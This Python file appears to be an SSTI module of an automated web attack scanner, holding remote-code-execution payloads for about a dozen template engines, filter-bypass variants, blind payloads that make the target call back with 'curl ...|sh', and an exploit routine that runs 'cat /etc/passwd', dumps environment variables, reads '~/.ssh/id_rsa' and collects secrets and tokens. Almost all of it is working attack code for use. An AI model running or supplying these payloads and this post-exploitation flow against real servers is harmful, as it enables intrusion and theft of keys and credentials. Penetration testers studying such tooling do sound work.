import re
import asyncio
from modules.base import BaseModule
from core.utils import extract_params, random_int, random_string


class SstiModule(BaseModule):
    name = "ssti"
    description = "Server-Side Template Injection Scanner with Auto RCE"
    exploitable = True
    
    engines = {
        "jinja2": {
            "probe": "{{%d*%d}}",
            "confirm": ["{{config}}", "{{request.application.__globals__}}"],
            "rce": [
                "{{request.application.__globals__.__builtins__.__import__('os').popen('%s').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('%s').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('%s').read()}}",
                "{%% for x in ().__class__.__base__.__subclasses__() %%}{%% if 'warning' in x.__name__ %%}{{x()._module.__builtins__['__import__']('os').popen('%s').read()}}{%% endif %%}{%% endfor %%}",
            ],
        },
        "twig": {
            "probe": "{{%d*%d}}",
            "confirm": ["{{_self.env}}", "{{app.request.server.all|join(',')}}"],
            "rce": [
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('%s')}}",
                "{{['%s']|filter('system')}}",
            ],
        },
        "freemarker": {
            "probe": "${%d*%d}",
            "confirm": ["${.data_model}", "${.vars}"],
            "rce": [
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("%s")}',
                '<#assign cmd="%s"><#assign ex="freemarker.template.utility.Execute"?new()>${ex(cmd)}',
            ],
        },
        "velocity": {
            "probe": "#set($x=%d*%d)$x",
            "confirm": ["$class.inspect", "#set($str=$class.inspect)"],
            "rce": [
                "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('%s'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            ],
        },
        "smarty": {
            "probe": "{%d*%d}",
            "confirm": ["{$smarty.version}"],
            "rce": [
                "{system('%s')}",
                "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('%s');?>\",self::clearConfig())}",
            ],
        },
        "mako": {
            "probe": "${%d*%d}",
            "confirm": ["<%page args=\"x=''\"/>"],
            "rce": [
                "${__import__('os').popen('%s').read()}",
                "<%import os%>${os.popen('%s').read()}",
            ],
        },
        "erb": {
            "probe": "<%%=%d*%d%%>",
            "confirm": ["<%= Dir.entries('/') %>"],
            "rce": [
                "<%= `%s` %>",
                "<%= system('%s') %>",
                "<%= IO.popen('%s').readlines() %>",
            ],
        },
        "pebble": {
            "probe": "{{%d*%d}}",
            "confirm": ['{{\"test\".class}}'],
            "rce": [
                '{% set cmd = "%s" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName("java.lang.String").constructors[0].newInstance(([bytes])}}',
            ],
        },
        "jade": {
            "probe": "#{%d*%d}",
            "confirm": ["#{7*7}"],
            "rce": [
                "#{root.process.mainModule.require('child_process').execSync('%s')}",
                "-var x = root.process.mainModule.require('child_process').execSync('%s').toString()\n=x",
            ],
        },
        "tornado": {
            "probe": "{{%d*%d}}",
            "confirm": ["{{handler.settings}}"],
            "rce": [
                "{%% import os %%}{{os.popen('%s').read()}}",
            ],
        },
        "django": {
            "probe": "{{%d|add:%d}}",
            "confirm": ["{{request}}", "{{settings}}"],
            "rce": [],
        },
        "nunjucks": {
            "probe": "{{%d*%d}}",
            "confirm": ["{{range(10)}}"],
            "rce": [
                "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('%s').toString()\")()}}",
            ],
        },
    }
    
    rce_commands = ["id", "whoami", "hostname", "uname -a"]
    rce_markers = ["uid=", "gid=", "root", "www-data", "nginx", "apache"]
    
    def _get_echo_command(self):
        marker = random_string(12)
        return f"echo {marker}", marker
    
    async def scan(self, target):
        self.findings = []
        self.oob_manager = self.config.get("oob_manager")
        params = extract_params(target)
        
        if params:
            for param in params:
                engine, payload = await self._detect_engine(target, param)
                if engine:
                    await self._attempt_rce(target, param, engine)
                    break
        
        await self._test_body_ssti(target)
        
        if self.oob_manager:
            await self._test_blind_ssti_oob(target, params)
        
        if self.aggressive:
            await self._test_filter_bypass(target, params)
        
        return self.findings
    
    async def _test_blind_ssti_oob(self, target, params):
        token = self.oob_manager.generate_token()
        callback_url = self.oob_manager.get_http_url(token)
        dns_callback = self.oob_manager.get_dns_payload(token)
        
        oob_payloads = [
            f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('curl {callback_url}').read()}}}}",
            f"${{T(java.lang.Runtime).getRuntime().exec('curl {callback_url}')}}",
            f"<%=`curl {callback_url}`%>",
            f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('nslookup {dns_callback}'))$ex",
            f"{{{{''.__class__.__mro__[2].__subclasses__()[40]('curl {callback_url}|sh').read()}}}}",
            f"${{__import__('os').popen('curl {callback_url}').read()}}",
        ]
        
        for param in (params or ["template", "name", "message"]):
            for payload in oob_payloads:
                await self.test_param(target, param, payload)
        
        await asyncio.sleep(3)
        
        interactions = self.oob_manager.check_interactions(token)
        if interactions:
            self.add_finding(
                "CRITICAL",
                "Blind SSTI RCE CONFIRMED via OOB callback",
                url=target,
                evidence=f"Callback: {interactions[0]}",
                confidence_evidence=["oob_callback_received", "blind_ssti_rce"],
                request_data={"method": "GET", "url": target}
            )
            return True
        return False
    
    async def _test_filter_bypass(self, target, params):
        bypass_payloads = [
            ("{{request|attr('application')|attr('__globals__')}}", "attr bypass"),
            ("{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')}}", "hex escape"),
            ("{{()|attr('\\137\\137class\\137\\137')}}", "octal escape"),
            ("{%set x='__cla'+'ss__'%}{{''|attr(x)}}", "string concat"),
            ("{{lipsum|attr('__globals__')}}", "lipsum bypass"),
            ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "cycler bypass"),
            ("{{joiner.__init__.__globals__.os.popen('id').read()}}", "joiner bypass"),
        ]
        
        for param in (params or ["template"]):
            for payload, bypass_type in bypass_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    text = resp.get("text", "")
                    for marker in self.rce_markers + ["<class", "__globals__", "os"]:
                        if marker in text:
                            self.add_finding(
                                "CRITICAL",
                                f"SSTI Filter Bypass ({bypass_type})",
                                url=target,
                                parameter=param,
                                evidence=f"Bypass: {bypass_type}",
                                confidence_evidence=["filter_bypass", "ssti_confirmed"],
                                request_data={"method": "GET", "url": target, "param": param}
                            )
                            return
    
    async def _detect_engine(self, target, param):
        a, b = random_int(10, 99), random_int(10, 99)
        expected = str(a * b)
        
        for engine_name, engine_data in self.engines.items():
            probe = engine_data["probe"] % (a, b)
            resp = await self.test_param(target, param, probe)
            
            if resp.get("status") and expected in resp.get("text", ""):
                for confirm_payload in engine_data.get("confirm", []):
                    confirm_resp = await self.test_param(target, param, confirm_payload)
                    if confirm_resp.get("status"):
                        if self._check_confirm(confirm_resp["text"], engine_name):
                            self.add_finding(
                                "CRITICAL",
                                f"SSTI Confirmed - {engine_name}",
                                url=target,
                                parameter=param,
                                evidence=f"Math: {a}*{b}={expected}, Engine fingerprinted"
                            )
                            return engine_name, probe
                
                self.add_finding(
                    "HIGH",
                    f"SSTI Detected - Likely {engine_name}",
                    url=target,
                    parameter=param,
                    evidence=f"Math evaluation: {a}*{b}={expected}"
                )
                return engine_name, probe
        
        polyglot = "${{<%[%'\"}}%\\."
        resp = await self.test_param(target, param, polyglot)
        if resp.get("status"):
            if resp["status"] == 500 or self._detect_template_errors(resp["text"]):
                self.add_finding(
                    "MEDIUM",
                    "Possible SSTI (error triggered)",
                    url=target,
                    parameter=param,
                    evidence="Template error on polyglot injection"
                )
        
        return None, None
    
    async def _attempt_rce(self, target, param, engine):
        engine_data = self.engines.get(engine, {})
        rce_payloads = engine_data.get("rce", [])
        
        if not rce_payloads:
            self.add_finding(
                "HIGH",
                f"SSTI {engine} - No RCE payload available",
                url=target,
                parameter=param,
                evidence="Manual RCE testing required"
            )
            return
        
        for cmd in self.rce_commands:
            for rce_template in rce_payloads:
                try:
                    payload = rce_template % cmd
                except:
                    payload = rce_template.replace("%s", cmd)
                
                resp = await self.test_param(target, param, payload)
                
                if resp.get("status"):
                    text = resp.get("text", "")
                    
                    for marker in self.rce_markers:
                        if marker in text:
                            output = self._extract_command_output(text, cmd)
                            self.add_finding(
                                "CRITICAL",
                                f"SSTI RCE Achieved - {engine}",
                                url=target,
                                parameter=param,
                                evidence=f"Command: {cmd}, Output: {output[:200]}"
                            )
                            return
                    
                    if cmd == "whoami" and len(text) < 1000:
                        possible_user = re.search(r'\b([a-z_][a-z0-9_-]*)\b', text.lower())
                        if possible_user and possible_user.group(1) not in ['html', 'body', 'div', 'span', 'script']:
                            self.add_finding(
                                "CRITICAL",
                                f"SSTI RCE Likely - {engine}",
                                url=target,
                                parameter=param,
                                evidence=f"Command: {cmd}, Possible output: {possible_user.group(1)}"
                            )
                            return
    
    async def _test_body_ssti(self, target):
        a, b = random_int(10, 99), random_int(10, 99)
        expected = str(a * b)
        
        body_payloads = [
            f'{{"name": "{{{{ {a}*{b} }}}}"}}',
            f'{{"template": "{{{{ {a}*{b} }}}}"}}',
            f'{{"message": "${{{a}*{b}}}"}}',
        ]
        
        for payload in body_payloads:
            resp = await self.http.post(target, data=payload, headers={"Content-Type": "application/json"})
            
            if resp.get("status") and expected in resp.get("text", ""):
                self.add_finding(
                    "HIGH",
                    "SSTI via JSON body",
                    url=target,
                    evidence=f"Math evaluation in response: {a}*{b}={expected}"
                )
                return
    
    def _check_confirm(self, text, engine):
        confirmations = {
            "jinja2": ["SECRET_KEY", "config", "__globals__", "application"],
            "twig": ["_self", "env", "Twig"],
            "freemarker": ["data_model", "freemarker"],
            "velocity": ["class", "inspect", "Runtime"],
            "smarty": ["Smarty", "version"],
            "mako": ["mako", "args"],
            "erb": ["entries", "Dir"],
            "pebble": ["java.lang", "class"],
            "jade": ["process", "mainModule"],
            "tornado": ["settings", "handler"],
            "nunjucks": ["range", "constructor"],
        }
        
        for pattern in confirmations.get(engine, []):
            if pattern.lower() in text.lower():
                return True
        return False
    
    def _detect_template_errors(self, text):
        error_patterns = [
            r'TemplateSyntaxError', r'UndefinedError', r'Twig_Error',
            r'freemarker\.template', r'VelocityException', r'Smarty.*error',
            r'mako\.exceptions', r'ERB::Error', r'jade.*error',
            r'TemplateError', r'RenderError', r'ParseError',
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def _extract_command_output(self, text, cmd):
        if cmd == "id":
            match = re.search(r'uid=\d+\([^)]+\)\s*gid=\d+\([^)]+\)[^\n]*', text)
            if match:
                return match.group(0)
        
        for marker in self.rce_markers:
            idx = text.find(marker)
            if idx != -1:
                start = max(0, idx - 20)
                end = min(len(text), idx + 100)
                return text[start:end].strip()
        
        return text[:200]
    
    async def exploit(self, target, finding):
        param = finding.get("parameter")
        evidence = finding.get("evidence", "")
        
        detected_engine = None
        for engine in self.engines.keys():
            if engine.lower() in evidence.lower():
                detected_engine = engine
                break
        
        if not detected_engine:
            detected_engine = "jinja2"
        
        extracted = {"engine": detected_engine, "rce_output": {}, "env_vars": {}, "files": {}}
        
        rce_payloads = self.engines.get(detected_engine, {}).get("rce", [])
        if not rce_payloads:
            return None
        
        exploit_commands = [
            ("id", "user_context"),
            ("whoami", "current_user"),
            ("hostname", "hostname"),
            ("cat /etc/passwd", "passwd"),
            ("env", "environment"),
            ("cat /proc/self/environ", "proc_env"),
            ("ls -la /", "root_listing"),
            ("cat ~/.ssh/id_rsa", "ssh_key"),
        ]
        
        for cmd, key in exploit_commands:
            for rce_template in rce_payloads:
                try:
                    payload = rce_template % cmd
                except:
                    payload = rce_template.replace("%s", cmd)
                
                resp = await self.test_param(target, param, payload)
                if resp.get("status") == 200 and resp.get("text"):
                    text = resp["text"]
                    output = self._extract_command_output(text, cmd)
                    
                    if output and any(m in output for m in self.rce_markers + ["root:", "home", "usr", "var"]):
                        extracted["rce_output"][key] = output[:500]
                        
                        if key == "environment" or key == "proc_env":
                            env_matches = re.findall(r'([A-Z_]+)=([^\n]+)', output)
                            for k, v in env_matches:
                                if any(s in k.lower() for s in ["pass", "key", "secret", "token", "auth", "db"]):
                                    extracted["env_vars"][k] = v[:100]
                        
                        if key == "passwd":
                            users = re.findall(r'^([^:]+):[^:]*:(\d+):', output, re.MULTILINE)
                            extracted["users"] = [{"name": u[0], "uid": u[1]} for u in users[:10]]
                        
                        self.add_finding(
                            "CRITICAL",
                            f"SSTI EXPLOITED: RCE via {detected_engine} - {cmd}",
                            url=target,
                            parameter=param,
                            evidence=output[:300]
                        )
                        break
        
        if extracted["rce_output"] or extracted["env_vars"]:
            self.exploited_data = extracted
            return extracted
        
        return None